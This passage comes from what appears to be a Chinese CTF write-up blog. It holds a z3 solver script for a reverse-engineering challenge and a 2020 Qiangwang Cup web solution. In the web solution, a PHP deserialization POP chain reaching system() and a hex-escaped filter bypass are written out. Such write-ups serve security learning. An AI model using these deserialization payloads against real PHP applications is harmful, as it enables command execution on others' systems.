class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>) &amp; (a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>) &amp; (a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>) &amp; (a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>) &amp; (a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) &amp; (a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>) &amp; (a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>) &amp; (a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) &amp; (a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>) &amp; (a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>) &amp; (a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>) &amp; (a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>) &amp; (a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) &amp; (a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congratulations and have fun!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Sorry,plz try again...&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>直接丢z3就能出来了</p>
<blockquote>
<p>需要注意的是要把(a8 &lt;&lt; 7)改为(a8 * 128)，不然会报以下错误（Int类型不支持移位操作）</p>
<p>TypeError: unsupported operand type(s) for &lt;&lt;: ‘ArithRef’ and ‘ArithRef’</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">code1 = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">code2 = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">orders = [<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span> ,<span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="built_in">globals</span>()[<span class="string">f&#x27;a<span class="subst">&#123;i&#125;</span>&#x27;</span>] = Int(<span class="string">f&#x27;a<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">equations = <span class="string">&#x27;(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)&#x27;</span></span><br><span class="line">equations = equations.replace(<span class="string">&#x27;&lt;&lt; 7&#x27;</span>, <span class="string">&#x27;* 128&#x27;</span>)</span><br><span class="line">equations = equations.split(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">[s.add(<span class="built_in">eval</span>(_)) <span class="keyword">for</span> _ <span class="keyword">in</span> equations]</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        <span class="comment"># print(&quot;%s = %ld&quot; % (i, m[i].as_long()))</span></span><br><span class="line">        index = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, <span class="built_in">str</span>(i)).group()) - <span class="number">1</span></span><br><span class="line">        code1[index] = m[i].as_long()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 置换</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code1)):</span><br><span class="line">    code2[orders[i]] = code1[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 异或</span></span><br><span class="line">flag[<span class="number">13</span>] = code2[<span class="number">13</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    flag[i] = flag[i + <span class="number">1</span>] ^ code2[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] flag:&#x27;</span>, hashlib.md5(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> flag]).encode()).hexdigest())</span><br><span class="line"><span class="comment"># [+] flag: 58964088b637e50d3a22b9510c1d1ef8</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 强网杯 web</title>
    <url>/2020/08/29/2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-web/</url>
    <content><![CDATA[<p>强网杯的质量还是很高，只做出了一道web : )</p>
<span id="more"></span>

<h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><blockquote>
<p>php反序列化字符串逃逸</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;Riven&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">gettype</span>(<span class="variable language_">$this</span>-&gt;name) === <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> <span class="title function_ invoke__">gettype</span>(<span class="variable language_">$this</span>-&gt;name) === <span class="string">&quot;object&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            <span class="variable">$name</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">TP</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name !== <span class="string">&#x27;Yasuo&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;Yasuo&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No Yasuo! No Soul!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Gank</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable language_">$this</span>-&gt;name, <span class="string">&#x27;Yasuo&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you orphan?\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Must Be Yasuo!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">KS</span>();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$player</span> = <span class="keyword">new</span> <span class="title class_">player</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;caches/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), <span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$player</span>))); </span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Welcome %s, your ip is %s\n&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Please input the username or password!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0*\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0*\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;name&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Name Pass\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// play.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">check</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;caches/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br><span class="line"></span><br><span class="line">@<span class="variable">$player</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">check</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;caches/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$player</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$player</span>-&gt;<span class="title function_ invoke__">get_admin</span>() === <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;FPX Champion\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;The Shy unstoppable\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先找出payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">topsolo</span>(<span class="keyword">new</span> <span class="title class_">midsolo</span>(<span class="keyword">new</span> <span class="title class_">jungle</span>(<span class="string">&#x27;Tyao&#x27;</span>)));</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">player</span>(<span class="string">&#x27;Tyao&#x27;</span>,<span class="variable">$a</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Tyao&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;*pass&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*name&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*name&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Tyao&quot;</span>;&#125;&#125;&#125;s:<span class="number">8</span>:<span class="string">&quot;*admin&quot;</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>利用字节流S绕过对name的检测</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Tyao&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;*pass&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00*\00n\61me&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00*\00n\61me&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00*\00n\61me&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Tyao&quot;</span>;&#125;&#125;&#125;s:<span class="number">8</span>:<span class="string">&quot;*admin&quot;</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>查看正常的序列化数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;*pass&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;pwd&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;*admin&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>修改【pwd】的值使其和我们的payload匹配，顺便修改个长度</p>
